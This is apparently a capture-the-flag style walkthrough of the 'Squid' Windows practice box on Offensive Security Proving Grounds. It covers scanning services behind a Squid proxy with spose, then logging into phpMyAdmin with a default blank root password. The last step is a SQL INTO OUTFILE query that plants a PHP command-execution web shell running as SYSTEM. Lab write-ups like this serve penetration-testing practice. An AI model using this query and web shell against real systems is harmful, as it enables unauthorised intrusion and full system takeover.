# Squid

## Introduction

Squid is a 'warm up' category Windows box hosted by offsec proving grounds.  

## Enumeration

### Nmap

Nmap network scan.

`3128/tcp open  http-proxy syn-ack ttl 125 Squid http proxy 4.14`  

### Squid proxy

Using the following script to scan services behind squid proxy.  

`https://github.com/aancw/spose`

`python spose.py --proxy http://<ip>:3128 --target <ip>`


Ports open behind the proxy.  

```
3306
8080
```

## Root

After setting up a browser proxy with foxy proxy, I pointed the url to 8080.  

In phpinfo.php, there is the application webroot 'c:/wamp/www'.  

Logging in to phpmyadmin with default username 'root' and no password, it allows me to execute sql queries.  

The following allowed a webshell as ntauthority/system.  

`SELECT "<?php system($_REQUEST['cmd']);?>" INTO outfile 'c:/wamp/www/shell.php'`
